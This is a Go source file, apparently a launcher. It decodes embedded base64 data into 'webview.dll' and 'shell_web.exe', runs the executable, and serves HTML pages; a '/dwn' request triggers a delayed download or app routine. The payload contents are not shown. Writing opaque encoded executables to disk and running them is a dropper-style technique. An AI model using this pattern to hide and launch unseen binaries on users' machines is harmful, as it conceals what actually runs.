package main

import (
	"fmt"
	"head/main_com"
	"head/main_com/base64_code"
	"net/http"
	"strconv"
	"time"
)

func main() {
	base64Data := base64_code.Base64_dll_var
	outputFilePath := "webview.dll"

	main_com.Decode_Base64_ToFile(base64Data, outputFilePath)

	base64Data1 := base64_code.Base64_spx_var
	outputFilePath1 := "shell_web.exe"

	main_com.Decode_Base64_ToFile(base64Data1, outputFilePath1)

	port := main_com.FindFreePort()
	portStr := ":" + strconv.Itoa(port)

	fmt.Println(port)

	cmd := main_com.StartShellWeb(portStr)

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		fmt.Fprintf(w, main_com.Page_1)
	})

	http.HandleFunc("/dwn", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		fmt.Fprintf(w, main_com.Page_2)

		time.AfterFunc(2*time.Second, func() {
			main_com.DWN_app()
		})
	})

	if err := http.ListenAndServe(portStr, nil); err != nil {
		fmt.Printf("Не вдалося запустити сервер: %v\n", err)
	}

	if cmd != nil {
		if err := cmd.Wait(); err != nil {
			fmt.Printf("shell_web.exe завершився з помилкою: %v\n", err)
		}
	}
}
